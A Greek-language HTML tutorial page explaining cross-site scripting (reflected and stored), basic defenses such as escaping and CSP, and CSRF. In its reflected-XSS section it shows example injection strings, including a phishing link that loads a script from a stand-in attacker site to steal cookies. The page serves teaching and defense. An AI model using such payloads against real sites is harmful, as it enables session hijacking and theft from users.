<html>
	<head>
		<meta charset="utf-8" />
		<title>e-commerce xss</title>
		<!--  -->
		<link href="main.css" rel="stylesheet" type="text/css" />
	</head>
	<body>
		<h1>Cross-site scripting (XSS)</h1>
		<section>
		<p>Είναι ένα κενό ασφάλειας που συναντάται περισσότερο σε εφαρμογές διαδικτύου.</p>
		<p>Μέσω xss ο χάκερ μπορεί να εισάγει (inject) client-side σκριπτ (ουσιαστικά javascript) σε ιστοσελίδες.</p>
		<p>Το κακόβουλο σκριπτ εκτελείται στο πρόγραμμα περιήγησης του χρήστη δίνοντας τη δυνατότητα στον χάκερ να έχει πρόσβαση σε ευαίσθητα δεδομένα.</p>
		<p>Ο όρος, σταδιακά επεκτάθηκε και σε μη javascript κώδικα όπως ActiveX, java, VBScript, Flash ακόμα και σε html.</p>
		</section>

		<h2>Τύποι xss</h2>
		<section>
		<p>Μπορούμε να διακρίνουμε το xss σκρίπτ σε δύο τύπους.</p>
		</section>

		<h3>Reflected (non-persistent)</h3>
		<section>
		<p>Σε αυτή την περίπτωση το σκρίπτ μπορεί να εισαχθεί κρυφά μέσα σε ένα πεδίο φόρμας ή σε ένα URL.</p>
		<p>Όταν ο χρήστης καλέσει το URL ή κάνει αποστολή της φόρμας ο σέρβερ θα επιστρέψει ένα αποτέλεσμα που θα περιέχει το αρχικά εισαγόμενο σκρίπτ το οποίο θα εκτελεστεί στη μεριά του χρήστη. Από 'δω και ο όρος reflected.</p>
		<p>Κλασικό παράδειγμα οι φόρμες αναζήτησης όπου ο χρήστης εισάγει έναν όρο για αναζήτηση έστω «υπολογιστής», αν δίπλα προστεθεί και το σκριπτ:</p>
		<pre>&lt;script src = "..."&gt;</pre>
		<p>τότε ο όρος γίνεται:</p>
		<pre>υπολογιστής&lt;script src = "..."&gt;</pre>
		<p>Αν υποθέσουμε ότι ο σέρβερ στην πρώτη περίπτωση επιστρέφει:</p>
		<pre>Δεν βρέθηκε το προϊόν υπολογιστής</pre>
		<p>Στην δεύτερη περίπτωση (με το σκρίπτ να ακολουθεί) θα επιστρέφει:</p>
		<pre>Δεν βρέθηκε το προϊόν υπολογιστής&lt;script src = "..."&gt;</pre>
		<p>Το σκρίπτ θα εκτελεστεί στη μεριά του χρήστη με ότι κακόβουλο περιέχει.</p>
		<p>Αυτό μπορεί να είναι για παράδειγμα η κλοπή του cookie του χρήστη και η αποστολή του στον χάκερ. Στη συνέχεια ο χάκερ μπορεί να αντιγράψει το cookie στον δικό του browser και να συνδεθεί με το session του χρήστη στην εφαρμογή (π.χ. e-shop) που είναι ήδη συνδεδεμένος ο χρήστης.</p>
		<p>Ένα άλλο παράδειγμα είναι όταν ο χρήστης λαμβάνει ένα email (δόλωμα) με ένα λινκ το οποίο μπορεί να γράφει:</p>
		<pre>Απίθανες προσφορές στο offers-e-shop.gr</pre>
		<p>Αλλά στο href (που δεν βλέπει ο χρήστης) να γράφει:</p>
		<pre>href = “http://www.offers-e-shop.gr?q=offers&lt;script%20src='http://www.mybadsite.gr/badscript.js'&gt;”</pre>
		<p>Όταν κάνει κλικ στο λινκ θα καλέσει το URL:</p>
		<pre>http://www.offers-e-shop?q=offers&lt;script%20src='http://www.mybadsite.gr/badscript.js'&gt;</pre>
		<p>Ο σέρβερ θα του επιστρέψει και το σκριπτ το οποίο θα εκτελεστεί στη μεριά του χρήστη.</p>
		</section>


		<h3>Persistent attack</h3>
		<section>
		<p>Αυτός ο τύπος επίθεσης (xss) έχει το χαρακτηριστικό ότι τι κακόβουλο σκριπτ αποθηκεύεται στον σέρβερ και μένει εκεί μόνιμα (persistent).</p>
		<p>Για παράδειγμα σε έναν ευάλωτο σε xss επιθέσεις ιστότοπο τύπου blog, ο χάκερ αφού κάνει εγγραφή, αναρτεί ένα κείμενο με ένα λινκ.</p>
		<p>Το λινκ αυτό μπορεί να είναι ένα δόλωμα το οποίο καλεί ένα URL όπως αυτό που αναφέρθηκε παραπάνω:</p>
		</section>

		<h2>Άμυνα</h2>
		<section>
		<p>Από τα παραπάνω παραδείγματα γίνεται φανερό ότι ο σέρβερ δέχεται τα δεδομένα χωρίς να τα ελέγχει (server side validation).</p>
		</section>

		<h3>encoding/escaping.</h3>
		<section>
		<p>Άρα, ως πρώτη άμυνα μπορούμε να θεωρήσουμε τον καλό έλεγχο των δεδομένων με τεχνικές όπως encoding/escaping.</p>
		</section>

		<h3>Cookie security</h3>
		<section>
		<p>Επειδή μέσω xss αυτό που γίνεται συνήθως είναι η κλοπή του cookie, μπορούμε στο sessions να προσθέσουμε και το IP του χρήστη για περισσότερη ασφάλεια.</p>
		</section>

		<h3>Disabling scripts</h3>
		<section>
		<p>Η απενεργοποίηση του σκριπτ στο πρόγραμμα περιήγησης μπορεί να προστατέψει τον χρήστη αλλά θα  του στερήσει λειτουργικότητα και ταχύτητα.</p>
		</section>
		<h3>Content Security Policy (CSP)</h3>
		<section>
		<p>Αναδυόμενη τεχνική σύμφωνα με την οποία ένας ιστότοπος θα δέχεται κώδικα προερχόμενο μόνο από τον συγκεκριμένο ιστότοπο.</p>
		</section>

		<h2>Παρόμοιες απειλές</h2>
		<section>
		<p>Μία παρόμοια απειλή με αυτή του xss είναι η (CSRF/XSRF)</p>
		</section>

		<h3>Cross-site request forgery (CSRF/XSRF)</h3>
		<section>
		<p>Εδώ ο χάκερ εισάγει σκριπτ στη μεριά του χρήστη, ο κώδικας εκτελείται με αιτήματα (requests) προς τον σέρβερ για τα οποία ο χρήστης δεν γνωρίζει.</p>
		<p>Δηλαδή ο σέρβερ δέχεται αιτήματα από έναν πιστοποιημένο χρήστη και τα εκτελεί, δεν γνωρίζει όμως ούτε ο σέρβερ ούτε ο χρήστης ότι τα αιτήματα αυτά γίνονται από κρυφό σκριπτ για λογαριασμό του χάκερ.</p>
		</section>
	</body>
</html>
